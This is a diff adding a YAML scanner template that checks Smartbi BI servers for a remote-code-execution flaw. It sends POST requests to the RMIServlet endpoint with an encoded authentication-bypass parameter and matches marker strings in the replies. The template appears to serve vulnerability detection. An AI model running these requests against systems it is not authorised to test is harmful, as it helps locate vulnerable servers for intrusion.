@@ -1,0 +1,75 @@
+name: yaml-poc-smartbi-smartbi_bi-rce-CT-778385
+binding: 01123421-95a7-4d5e-8043-3b99eab990ba
+detail:
+    author: yuxiang.cai
+    vulnerability:
+        id: e582e1f7-0bc2-4e27-bf8d-b0dc29b70d45
+        level: high
+    warning: Harmless
+transport: http
+payloads:
+    payloads:
+        p0:
+            value: '"smartbi/vision/RMIServlet"'
+        p1:
+            value: '"vision/RMIServlet"'
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /{{value}}?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=UserService&methodName=isLogged&params=[]
+        expression: response.body_string.contains('H~CxOm')
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /{{value}}?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=UserService&methodName=isLogged&params=[]
+        expression: response.body_string.contains('H~CxOm')
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /{{value}}?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=UserService&methodName=isLogged&params=[]
+        expression: response.body_string.contains('H~CxOm')
+    r3:
+        request:
+            cache: true
+            method: POST
+            path: /{{value}}?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=UserService&methodName=isLogged&params=[]
+        expression: response.body_string.contains('H~CxOm')
+    r4:
+        request:
+            cache: true
+            method: POST
+            path: /{{value}}?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: className=DataSourceService&methodName=testConnectionList&params=%5b%5d
+        expression: response.body_string.contains('传进来的参数')
+    r5:
+        request:
+            cache: true
+            method: POST
+            path: /{{value}}?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: className=DataSourceService&methodName=testConnectionList&params=%5b%5d
+        expression: response.body_string.contains('传进来的参数')
+expression: (r0() || r1() || r2() || r3()) && (r4() || r5())
